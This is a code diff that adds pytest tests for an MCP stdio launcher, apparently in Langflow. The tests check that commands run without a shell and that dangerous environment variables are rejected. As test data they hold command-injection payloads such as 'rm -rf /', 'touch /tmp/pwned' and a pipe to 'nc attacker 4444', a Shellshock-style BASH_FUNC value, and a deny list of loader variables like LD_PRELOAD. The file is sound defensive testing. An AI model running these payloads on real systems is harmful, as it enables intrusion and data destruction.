@@ -7,6 +7,7 @@ This test suite validates the MCP utility functions including:
 """
 
 import asyncio
+import os
 import re
 import shutil
 import sys
@@ -24,10 +25,181 @@ from lfx.base.mcp.util import (
     _is_transient_streamable_http_error,
     _process_headers,
     _should_attempt_sse_after_streamable_failure,
+    _validate_mcp_stdio_env,
     update_tools,
     validate_headers,
 )
 from lfx.schema.data import Data
+
+
+def test_validate_mcp_stdio_env_rejects_shellopts_ps4_combo():
+    with pytest.raises(ValueError, match="SHELLOPTS"):
+        _validate_mcp_stdio_env({"SHELLOPTS": "xtrace", "PS4": "$(id)"})
+
+
+@pytest.mark.parametrize("env_var", ["SHELLOPTS", "shellopts", "BASHOPTS", "PS4"])
+def test_validate_mcp_stdio_env_rejects_bash_trace_controls(env_var):
+    with pytest.raises(ValueError, match="Environment variable"):
+        _validate_mcp_stdio_env({env_var: "malicious_value"})
+
+
+def test_validate_mcp_stdio_env_allows_regular_env():
+    env = {"DEBUG": "true", "PORT": "8080"}
+
+    assert _validate_mcp_stdio_env(env) is env
+
+
+# Binaries that would indicate a shell interpreter is being interposed between
+# Langflow and the MCP server process. After the shell=False refactor none of
+# these should ever appear as the launched command.
+_SHELL_INTERPRETERS = frozenset({"bash", "sh", "zsh", "cmd", "cmd.exe", "powershell", "powershell.exe", "/bin/sh"})
+
+
+class TestMCPStdioShellFreeLaunch:
+    """Tests for the shell=False stdio launcher.
+
+    The launcher tokenizes the command string with ``shlex.split`` and hands the
+    structured ``command`` + ``args`` to ``StdioServerParameters`` directly -- no
+    ``bash -c`` / ``cmd /c`` wrapper. These tests assert on the
+    ``_connection_params`` the launcher builds (the MCP SDK process spawn itself
+    is mocked out) so they run deterministically on any OS.
+    """
+
+    @staticmethod
+    def _client_with_mocked_session():
+        """Return a client whose session creation is stubbed so no process spawns."""
+        client = MCPStdioClient()
+        mock_session = MagicMock()
+        mock_session.list_tools = AsyncMock(return_value=MagicMock(tools=["sentinel-tool"]))
+        get_session = AsyncMock(return_value=mock_session)
+        client._get_or_create_session = get_session  # type: ignore[method-assign]
+        return client, get_session
+
+    async def test_benign_command_launches_without_shell(self):
+        """A normal command is exec'd directly: structured argv, no shell binary."""
+        client, get_session = self._client_with_mocked_session()
+
+        tools = await client._connect_to_server("uvx mcp-server-fetch --port 8080")
+
+        assert tools == ["sentinel-tool"]
+        get_session.assert_awaited_once()
+        params = client._connection_params
+        assert params.command == "uvx"
+        assert params.args == ["mcp-server-fetch", "--port", "8080"]
+        # No shell interpreter is interposed and no shell "-c" / "/c" flag is present.
+        assert params.command not in _SHELL_INTERPRETERS
+        assert "-c" not in params.args
+        assert "/c" not in params.args
+
+    async def test_multiword_command_is_split_into_executable_and_args(self):
+        """'uvx mcp-server-fetch' splits into executable + first arg, not one binary name."""
+        client, _ = self._client_with_mocked_session()
+
+        await client._connect_to_server("uvx mcp-server-fetch")
+
+        params = client._connection_params
+        assert params.command == "uvx"
+        assert params.args == ["mcp-server-fetch"]
+
+    async def test_trusted_path_and_debug_are_injected_benign_env_passes_through(self):
+        """The launcher injects a trusted PATH + DEBUG and forwards validated user env."""
+        client, _ = self._client_with_mocked_session()
+
+        await client._connect_to_server("node server.js", env={"MCP_SERVER_FLAG": "user-value", "PORT": "8080"})
+
+        env = client._connection_params.env
+        assert env["PATH"] == os.environ["PATH"]
+        assert env["DEBUG"] == "true"
+        assert env["MCP_SERVER_FLAG"] == "user-value"
+        assert env["PORT"] == "8080"
+
+    @pytest.mark.parametrize(
+        "payload",
+        [
+            "node server.js; touch /tmp/pwned",  # command chaining
+            "node server.js && rm -rf /",  # logical-and chaining
+            "node $(id) server.js",  # command substitution
+            "node `id` server.js",  # backtick substitution
+            "node server.js | nc attacker 4444",  # pipe to listener
+        ],
+    )
+    async def test_shell_metacharacter_payloads_become_literal_argv(self, payload):
+        """Shell metacharacters are inert: with no shell, they are just literal argv tokens.
+
+        Under the old ``bash -c "exec ..."`` wrapper these payloads would chain a
+        second command. With shell=False the launched binary is the real
+        executable and the metacharacters are passed to it verbatim -- there is no
+        shell to interpret ``;``, ``&&``, ``|``, ``$()`` or backticks.
+        """
+        client, _ = self._client_with_mocked_session()
+
+        await client._connect_to_server(payload)
+
+        params = client._connection_params
+        # The real binary is launched, never a shell.
+        assert params.command == "node"
+        assert params.command not in _SHELL_INTERPRETERS
+        # The dangerous tokens survive only as literal arguments handed to node,
+        # so they cannot spawn `touch`, `rm`, `nc`, or a substitution subshell.
+        joined = " ".join(params.args)
+        assert any(marker in joined for marker in (";", "&&", "|", "$(", "`"))
+
+    async def test_bash_func_env_is_rejected_before_any_spawn(self):
+        """BASH_FUNC_* (Shellshock-style) env is both inert under shell=False and rejected.
+
+        The backstop must fire before ``_get_or_create_session`` so the value never
+        reaches a spawned process.
+        """
+        client, get_session = self._client_with_mocked_session()
+
+        with pytest.raises(ValueError, match="not allowed"):
+            await client._connect_to_server("node server.js", env={"BASH_FUNC_evil%%": "() { id; }"})
+
+        get_session.assert_not_awaited()
+        assert client._connection_params is None
+
+    async def test_ifs_env_is_rejected_before_any_spawn(self):
+        """IFS word-splitting env is rejected by the launch-time backstop."""
+        client, get_session = self._client_with_mocked_session()
+
+        with pytest.raises(ValueError, match="not allowed"):
+            await client._connect_to_server("node server.js", env={"IFS": "\n"})
+
+        get_session.assert_not_awaited()
+
+    @pytest.mark.parametrize(
+        "dangerous_env",
+        [
+            {"LD_PRELOAD": "/opt/evil.so"},
+            {"LD_LIBRARY_PATH": "/opt/evil"},
+            {"DYLD_INSERT_LIBRARIES": "/opt/evil.dylib"},
+            {"GCONV_PATH": "/opt/evil"},
+            {"PYTHONPATH": "/opt/evil"},
+            {"NODE_OPTIONS": "--require /opt/evil.js"},
+            {"PATH": "/opt/evil"},
+        ],
+    )
+    async def test_loader_and_interpreter_env_still_rejected(self, dangerous_env):
+        """Loader/interpreter env vars stay blocked even though no shell is launched.
+
+        These are honored by the dynamic linker or the target interpreter itself,
+        so shell=False does not neutralize them -- the denylist backstop must.
+        """
+        client, get_session = self._client_with_mocked_session()
+
+        with pytest.raises(ValueError, match="not allowed"):
+            await client._connect_to_server("python server.py", env=dangerous_env)
+
+        get_session.assert_not_awaited()
+
+    async def test_empty_command_is_rejected(self):
+        """An empty/whitespace command string raises rather than spawning an empty argv."""
+        client, get_session = self._client_with_mocked_session()
+
+        with pytest.raises(ValueError, match="empty"):
+            await client._connect_to_server("   ")
+
+        get_session.assert_not_awaited()
 
 
 class TestMCPSessionManager:
